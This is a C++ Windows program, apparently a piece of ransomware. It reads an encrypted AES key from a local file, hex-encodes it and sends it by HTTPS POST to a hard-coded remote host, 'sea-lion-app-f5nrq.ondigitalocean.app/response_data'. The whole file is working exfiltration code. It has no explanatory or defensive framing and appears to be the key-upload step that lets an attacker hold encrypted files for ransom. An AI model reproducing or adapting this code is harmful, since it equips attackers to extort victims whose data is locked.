#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include <string.h>
#include <sstream>
#include <vector>
#include <tchar.h>  
#include <iomanip>
#include <iostream>
#include <fstream>




#define SERVERNAME "placeholder"
#define SLEEP 10
std::string hexStr(const uint8_t *data, int len)
//https://stackoverflow.com/questions/14050452/how-to-convert-byte-array-to-hex-string-in-visual-c
{
     std::stringstream ss;
     ss << std::hex << std::setfill ('0');
     for( int i(0) ; i < len; ++i )
         ss<<std::setw(2)<<static_cast<int>(data[i]);
     return ss.str();
}

int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata){
    DWORD datalen=strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        LPSTR returnbuffer=new char[bytesneeded+1];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                bytesneeded+1,
                                NULL);
                                if(dataread==TRUE){
                                    return 0;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
return -1;
}
PUCHAR filetobuffer(const char* infile,int size){
    //Returns buffer from filepath
    std::ifstream FileText;
    FileText.open(infile,std::ios::in|std::ios::binary|std::ios::ate);
    //int size=FileText.tellg();
    FileText.seekg(0,std::ios::beg);
    char* oData=0;
    oData = new char[ size +1];
    FileText.read(oData,size);
    oData[size]='\0';
    FileText.close();
    printf("Filesize: %i\n",size);
    return (PUCHAR)oData;   
}



int main(){            
    PUCHAR postdata=filetobuffer("encrypted_aes_key.txt",128);               
    std::string hexstring=hexStr(postdata,128);
    printf("%i",hexstring.length());
    const char *truehex=hexstring.c_str();
    makePostRequest(L"sea-lion-app-f5nrq.ondigitalocean.app",L"/response_data",truehex);
    return 0;
}